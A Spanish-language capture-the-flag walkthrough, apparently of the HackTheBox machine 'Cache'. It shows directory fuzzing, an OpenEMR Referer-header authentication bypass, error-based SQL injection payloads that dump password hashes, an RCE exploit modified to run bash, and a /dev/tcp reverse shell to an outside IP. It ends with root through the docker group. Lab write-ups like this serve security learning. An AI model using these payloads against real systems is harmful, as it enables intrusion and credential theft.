PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Nos vamos al Puerto 80 y vemos una simple web

-Hacemos Fuzzing de Directorios:
	-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.188 -t 100 -x txt,html,php
		/login.html
		/contactus.html
		/index.html
		/author.html
		/news.html
		/net.html
		/javascript

-Nos vamos a **'/login.html'** y probamos a poner Credenciales Random. Nos sale un Pop Up de que el Usuario es Inválido y otro Pop Up que nos dice que la Contraseña es Inválida.

## Information Disclosure

-Nos vamos a **'/author.html'** y Descubrimos que el Author de la Máquina se llama 'ash', volvemos a **'/login.html'** y Probamos a poner el Usuario: ash y Contraseña una Random.
	-Solo nos sale el Pop Up de Contraseña Incorrecta, lo que quiere decir que **el Usuario 'ash' es Válido.**

-Sin embargo, aunque hacemos Fuerza Bruta al Usuario 'ash', no conseguimos averiguar su contraseña

-Pero si nos vamos a la siguiente ruta, encontramos en texto claro las credenciales de ash:
	'**/jquery/functionality.js**'
		username: ash
		password: H@v3_fun

(Lo usaremos más adelante)

--------------------------------------------------------------------------

-Nos autenticamos en /login.html con las credenciales obtenidas de 'ash' pero no hay nada interesante.

-En /author.html también encontramos el siguiente texto:
	-HMS(Hospital Management System)

-Añadimos los siguientes Dominios al /etc/hosts
	-cache.htb 
	-hms.htb

-Buscamos --> http://hms.htb
	-Es un **Panel de Login** del Servicio -->  **OpenEMR**

## Authentication Bypass + SQLI 

-Buscamos exploits y Encontramos el siguiente:
	-CVE-2018-15152 - **OpenEMR 5.0.1.3 - Authentication Bypass**
		https://www.exploit-db.com/exploits/50017

-Podemos hacer un Authentication Bypass y ver ciertas rutas que no podríamos ver de normal (las rutas que podemos ver están en el exploit)

-Con BurpSuite:
	1-Hacemos una Petición a 'http://hms.htb/portal/account/register.php' para pillar las Cookies
	2-Hacemos otra Petición a la ruta que queramos ver, insertando la cabecera 'Referer':
		**GET /portal/messaging/messages.php HTTP/1.1**
		**Host: hms.htb**
		**Cookie: OpenEMR=k2f30l1m3rii42u40nchc7608e; PHPSESSID=b3fk36g93plsuh0q6bggsunu8n**
		**Referer: http://hms.htb/portal/account/register.php**
			**-Vemos el Contenido de la RUTA!!**

-Con Curl:
	curl -s -X GET http://hms.htb/portal/messaging/messages.php -H "Referer: http://hms.htb/portal/account/register.php" -b "Cookie: OpenEMR=k2f30l1m3rii42u40nchc7608e; PHPSESSID=b3fk36g93plsuh0q6bggsunu8n"

-Desde el Navegador:
	-También podemos saltarnos la Autenticación Directamente desde el navegador:
		**-http://hms.htb/portal/messaging/messages.php**

-Encontramos el siguiente recurso y vemos que Podemos **Combinar el Authentication Bypass con SQLI**:
	https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf

-Para **Explotar el SQLI:**
	-Nos vamos a la ruta '/add_edit_event_user.php', gracias al Auth Bypass y Explotamos la SQLI:
		-http://host/openemr/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))
			**5.7.30-0ubuntu0.18.04.1**

-Listamos la BDS Existentes:
	-http://hms.htb/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,(select GROUP_CONCAT(schema_name) FROM information_schema.schemata)))
		**information_schema, openemr**

-Listamos las tablas de la BD 'openemr':
	-http://hms.htb/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,(select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='openemr')))
		**addresses, users_secure, user_settings**

-Listamos las Columnas de la Tabla 'users_secure':
	-http://hms.htb/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,(select GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users_secure')))
		**id,username,password,salt,**

-Listamos el Contenido de los Campos 'username' y 'password':
	-http://hms.htb/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,(select GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users_secure')))
		**openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'**

**-NOTA:** Al hacer la última QUERY no veíamos el hash completo por que se cortaba, para verlo por partes jugamos con substring:
	-http://hms.htb/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,(select substring(password 30,50) FROM information_schema.columns WHERE table_name='users_secure')))
(Vamos Cambiando los Valores para ir viendo el hash por partes y acabar por verlo entero)

--------------------------------------------------------------------------

-Rompemos el hash obtenido con john:
	-john -w=/usr/share/wordlists/rockyou.txt hash.txt
		**xxxxxx   (?)**

-Nos vamos al Login en 'http://hms.htb' e introducimos las credenciales:
	-Username: openemr_admin
	-Password: xxxxxx
		**Estamos Dentrooo!!**

-Ahora Buscamos Exploits para RCE (Authenticated):
	-searchsploit -m php/webapps/45161.py

-Tenemos que cambiar esta línea a esto para que funione:
	_cmd = "|| echo " + base64.b64encode(args.cmd.encode()).decode() + "|base64 -d|bash"

-Nos mandamos una RS:
	-python3 45161.py http://hms.htb -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.24/1234 0>&1'
		**www-data@cache:/$ whoami**
			**www-data**

## Escalada de Privilegios

-Pivotamos al usuario 'ash':
	-su ash
	-Password: H@v3_fun

-Vemos los puertos que están abiertos Internamente:
	-ss -tan
		**11211** (Este nos llama la atención, es el **Memcached**)

-Nos conectamos al Servicio Memcached y lo enumeramos:
	-Nos conectamos por localhost:
		-nc localhost 11211
	-Enumeramos Stats:
		-stats slabs
			Stat 1
	-Listamos el Stat 1:
		-stats cachedump 1 0
			ITEM user [5 b; 0 s]
			ITEM passwd [9 b; 0 s]
	-Listamos el Contenido de los items 'user' y 'passwd':
		get user
			**luffy**
		get passwd
			**0n3_p1ec3**

-Pivotamos al usuario 'luffy':
	-su luffy
	-Password: 0n3_p1ec3
		luffy@cache:/$ whoami 
			luffy

-Ejecutamos el Comando 'id' con el usuario 'luffy':
	-luffy@cache:/$  id
		uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),**999(docker)**

-Está en el Grupo 'docker', listamos las Imágenes del sistema:
	-docker images:
		ubuntu

-Escalamos a root con el siguiente Comando sacado de Gtfobins (shell), sustituyendo 'alpine' por ubuntu, ya que la máquina no tiene conectuvidad a Internet y no puede acceder a 'alpine', pero si a la imagen 'ubuntu' que tiene en local:
	-docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
		**root@3156382c89dc:/# whoami**
			**root**
